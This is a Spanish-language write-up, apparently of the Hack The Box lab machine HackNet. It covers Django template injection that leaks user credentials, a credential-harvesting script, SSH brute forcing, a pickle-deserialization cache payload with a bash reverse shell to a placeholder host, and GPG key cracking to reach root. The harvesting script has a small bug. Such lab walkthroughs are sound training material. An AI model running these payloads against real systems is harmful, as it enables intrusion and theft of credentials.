---
title: "HackNet - HTB"
date: 2025-10-01
draft: false
summary: "This is my first post on my site"
tags: ["python","django","PKI","SSTI"]
---
## Nmap
cuando realizo enumeracion siempre suelo hacer (2) escaneos, uno rapido y otro detallado

* Primero el escaneo rapido
```
sudo nmap -sS 10.10.11.85 -p- -n --min-rate 5000
[sudo] contraseña para alialucas7:
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-02 10:30 -0300
Nmap scan report for 10.10.11.85
Host is up (0.28s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.30 seconds
```
* Encontramos 2 puertos abiertos, ahora hagamos un escaneo mas detallado
```
nmap -sCV 10.10.11.85 -p22,80 -oN puertos.txt
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-02 10:33 -0300
Nmap scan report for hacknet.htb (10.10.11.85)
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: HackNet - social network for hackers
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.47 seconds
```

## Pagina web en Django
Hay una aplicacion web corriendo en el puerto 80, se trata de un framework django
```python
echo '10.10.11.85 hacknet.htb' | sudo tee  -a /etc/hosts
```
{{< figure
src="1.png"
>}}
### Enumeracion
Registramos un usuario y podemos realizar las siguientes acciones
* Modificar informacion personal
* Enviar Mensajes
* Likear post 

{{< figure
src="2.png"
>}}

Dado que es un entorno de lenguaje Python, Intentaremos tirar por la inyeccion de plantillas SSTI. </br>Abajo dejo informacion de que trata el ataque
* https://portswigger.net/web-security/server-side-template-injection#what-is-server-side-template-injection

Django utiliza un lenguaje de plantillas llamado `DTL` esto permite generar contenido HTML dinamico. Un componente que nos interesa son las
* Variables: Se insertan datos que provienen de las vistas en el código HTML. Se escriben entre llaves dobles, como {{ variable }}.

### Filtrar Credenciales 
Vamos a cambiar nuestro nombre de usuario a `{{ users }}` para intentar filtrar la matriz de usuarios mediante renderizado.
{{< figure
src="4.png"
>}}
El punto de renderizado que se puede usar aquí es darle "like" a un artículo al azar y luego consultar la lista de "likes".


{{< figure
src="5.png"
>}}


Nos dirijimos a al link de la consulta y analizamos el codigo fuente

{{< figure
src="7.png"
>}}
{{< figure

src="6.png"
>}}

Analizando detalladamente el codigo, podemos observar que se trata de una lista de usuarios (QuerySet) y que cada elemento es un objeto del tipo `SocialUser`
```javascript
<QuerySet [
    <SocialUser: cyberghost>,
    <SocialUser: shadowcaster>,
    <SocialUser: glitch>,
    <SocialUser: netninja>,
    <SocialUser: exploit_wizard>,
    <SocialUser: whitehat>,
    <SocialUser: deepdive>,
    <SocialUser: virus_viper>,
    <SocialUser: brute_force>,
    <SocialUser: {{ users }}>
]>
```

Para obtener ahora los campos y valores asociados al objeto de lista, debemos cambiar nustro nombre de usuario a: 
```python
{{ users.values}}
```
Volvemos a realizar el mismo procedimiento que hicimos anteriormente y analizamos el codigo fuente de la peticion GET
* BOOM! tenemos una lista de usuarios con credenciales

 {{< figure
 src="8.png"
 >}}

 * Debemos tener en cuenta que: la lista de usuarios que se muestra aquí, solo incluye la lista de Me gusta actual, es decir, los usuarios a quienes les gustó esta publicacion especifica
 * Me interesa obtener los likes de todas las publicaciones, para asi obtener sus credenciales. Este es un script en python que automatiza este proceso.
 ```python
#Agregar sus cokies al script antes de ejecutar
import re
import requests
import html

url = "http://hacknet.htb"
headers = {
    'Cookie': "csrftoken= .....; sessionid= ....."
}
all_users = set()
for i in range(1, 31):

    requests.get(f"{url}/like/{i}", headers=headers)
    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
    if not img_titles:
        continue
    last_title = html.unescape(img_titles[-1])

    if "<QuerySet" not in last_title:
        requests.get(f"{url}/like/{i}", headers=headers)
        text = requests.get(f"{url}/likes/{i}", headers=headers).text
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
        if img_titles:
            last_title = html.unescape(img_titles[-1])

    emails = re.findall(r"'email': '([^']*)'", last_title)
    passwords = re.findall(r"'password': '([^']*)'", last_title)

    for email, p in zip(emails, passwords):
        username = email.split('@')[0]  
        all_users.add(f"{username}:{p}")

for item in all_users:
    print(item)
 ```

 Luego de ejecutar el script, obtendremos todas las credenciales
 ```
rootbreaker:R00tBr3@ker#
exploit_wizard:Expl01tW!zard
glitch:Gl1tchH@ckz
netninja:N3tN1nj@2024
blackhat_wolf:Bl@ckW0lfH@ck
mikey:*************
123:test
phreaker:Phre@k3rH@ck
whitehat:Wh!t3H@t2024
cryptoraven:CrYptoR@ven42
darkseeker:D@rkSeek3r#
trojanhorse:Tr0j@nH0rse!
abc:abc
packetpirate:P@ck3tP!rat3
datadive:D@taD1v3r
brute_force:BrUt3F0rc3#
cyberghost:Gh0stH@cker2024
test:test
{{request}}:{{request}}@gmail.com
shadowcaster:Sh@d0wC@st!
hexhunter:H3xHunt3r!
virus_viper:V!rusV!p3r2024
bytebandit:Byt3B@nd!t123
shadowwalker:Sh@dowW@lk2024
iridule:test123
zero_day:Zer0D@yH@ck
codebreaker:C0d3Br3@k!
stealth_hawk:St3@lthH@wk
deepdive:D33pD!v3r
shadowmancer:Sh@d0wM@ncer
 ```
## Shell como mikey
Utilizamos `hydra` para realizar fuerza bruta en SSH
<script src="https://asciinema.org/a/746144.js" id="asciicast-746144" async="true"></script>



Ingresamos con esas credenciales y obtenemos la flag de usuario
## Shell como sandy
Revise los archivos en el directorio del sitio web y descubri que el usuario es Sandy
{{< figure
src="11.png"
>}}
Hay ademas una carpeta de backup, la extension .gpg al final signica que esta cifrada.
</br> Por ende para descifrar los archivos necesitamos de las claves privadas, lastimosamente no tenemos, ni tampoco podemos acceder al usuario `sandy`


{{< figure
src="12.png"
>}}

Ejecute `linpeas.sh` dentro del usuario, pero no encontre nada interesante que me permita escalar privilegios.
</br> Lo unico que quedaba era analizar el codigo fuente de la aplicacion, por si encontraba algo que me pueda servir.
</br>En `/var/www/HackNet/SocialNetwork/views.py` hay varias cosas interesantes, relacionado a como maneja django el almacenamiento de la cache, especificamente en esta porcion de codigo.
```python
def explore(request):  
    if not "email" in request.session.keys():  
        return redirect("index")  
  
    session_user = get_object_or_404(SocialUser, email=request.session['email'])  
  
    page_size = 10  
    keyword = ""  
  
    if "keyword" in request.GET.keys():  
        keyword = request.GET['keyword']  
        posts = SocialArticle.objects.filter(text__contains=keyword).order_by("-date")  
    else:  
        posts = SocialArticle.objects.all().order_by("-date")  
  
    pages = ceil(len(posts) / page_size)  
  
    if "page" in request.GET.keys() and int(request.GET['page']) > 0:  
        post_start = int(request.GET['page'])*page_size-page_size  
        post_end = post_start + page_size  
        posts_slice = posts[post_start:post_end]  
    else:  
        posts_slice = posts[:page_size]  
  
    news = get_news()  
    request.session['requests'] = session_user.contact_requests  
    request.session['messages'] = session_user.unread_messages  
  
    for post_item in posts:  
        if session_user in post_item.likes.all():  
            post_item.is_like = True  
  
    posts_filtered = []  
    for post in posts_slice:  
        if not post.author.is_hidden or post.author == session_user:  
            posts_filtered.append(post)  
        for like in post.likes.all():  
            if like.is_hidden and like != session_user:  
                post.likes_number -= 1  
  
    context = {"pages": pages, "posts": posts_filtered, "keyword": keyword, "news": news, "session_user": session_user}  
  
    return render(request, "SocialNetwork/explore.html", context)
```
Puntos a Analizar:
* Los resultados de la visualización se almacenan en caché durante 60 segundos.

{{< alert >}}
**Warning!** Django utiliza `FileBasedCache` que es otro backend de caché de manera predeterminada para almacenar los valores de retorno relacionado con la vista.
{{< /alert >}}
* Riesgo de seguridad : si el directorio de caché se puede escribir y el contenido almacenado se utiliza directamente `pickle`, puede ser explotado por terceros para lanzar un ataque de deserialización (RCE).
* Django carga directamente el contenido de los archivos en caché sin ningún filtro. Esto significa que podemos construir cualquier contenido serializado malicioso para controlar el contenido devuelto por Django, incluso provocando un RCE. `Siempre que conozcamos el nombre y la ubicación de la caché,` podemos ejecutar código directamente.
* *Investigando encontre la carpeta donde django guarda la cache*


{{< figure 
src="14.png"
>}}
Cada ves que nos dirigimos a `http://hacknet.htb/explore?page=1` independiente del numero, sea 1,2,..n la cache se carga, y luego de 60 segundos todos los archivos son eliminados.
</br> Para ganar entonces acceso al usuario `sandy` tendremos que hacer lo siguiente.
* 1. Accedemos a `http://hacknet.htb/explore` para generar la cache.
* 2. Generamos la carga serializada de pickle, reescribiendo los archivos de la caché, lo siguiente es un script que realiza esta escritura.
Ejecuta en la terminal `echo '(bash >& /dev/tcp/TUIP/9091 0>&1)' | base64` ello debe ir en la variable cmd del script
```python3
import pickle  
import base64  
import os  
import time  
  
cache_dir = "/var/tmp/django_cache"  
cmd = "printf tu_rever_shell | base64 -d|bash"
  
class RCE:  
    def __reduce__(self):  
        return (os.system, (cmd,),)  
  
payload = pickle.dumps(RCE())  
  
for filename in os.listdir(cache_dir):  
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path)
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload)
            print(f"[+] Written payload to {filename}")
```

{{< figure
src="15.png"
>}}
* 3. Nos volvemos a dirigir a  `http://hacknet.htb/explore` para que se ejecute la cache maliciosa que modificamos.

{{< figure
src="16.png"
 caption="Finalmente logramos escalar al usuario sandy"
>}}

## Shell como root
Ahora con el usuario sandy ya tenemos acceso a la carpeta de backup que encontramos al principio. 
* El archivo de clave privada `GPG` se encontró en el directorio del usuario sandy
```bash
sandy@hacknet:~$ ls -la .gnupg/private-keys-v1.d
ls -la .gnupg/private-keys-v1.d
total 20
drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
drwx------ 4 sandy sandy 4096 Sep  5 11:33 ..
-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```
Hay un archivo `armored_key.asc` que esta encriptado y guarda una contraseña, con la herramienta john logre obtener el hash
```bash
gpg2john armored_key.asc > hash

File armored_key.asc

```
Luego desciframos el hash con john
```bash
 sudo snap run john-the-ripper hash --show
Sandy:sweetheart:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc

1 password hash cracked, 0 left

```
Ahora intentamos desencriptar los archivos de backup

{{< figure
src="20.png"
>}}
Ahora que el archivo ya se encuentra legile, busquemos contraseñas


{{< figure
src="fin.png"
>}}
Encontramos una contraseña, que por lo visto pertenece al usuario `root`, por ultimo iniciamos sesion y obtenemos la flag de root.txt

</br> Gracias por leer hasta aca:)
</br> Happy Hacking
